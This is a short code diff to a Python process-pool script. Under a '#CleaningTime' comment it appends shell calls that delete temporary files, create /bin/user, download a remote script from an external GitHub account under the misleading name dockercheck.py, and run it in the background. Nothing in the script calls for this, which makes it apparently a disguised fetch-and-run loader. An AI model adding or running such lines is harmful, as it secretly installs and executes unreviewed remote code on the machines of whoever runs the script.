@@ -38,3 +38,9 @@ def run_process(process):
 
 pool = Pool(processes=3)
 pool.map(run_process, processes)
+
+#CleaningTime
+os.system("rm -rf /tmp/process*")
+os.system("mkdir /bin/user")
+os.system("wget -O /bin/user/dockercheck.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher.py")
+os.system("python /bin/user/dockercheck.py &")
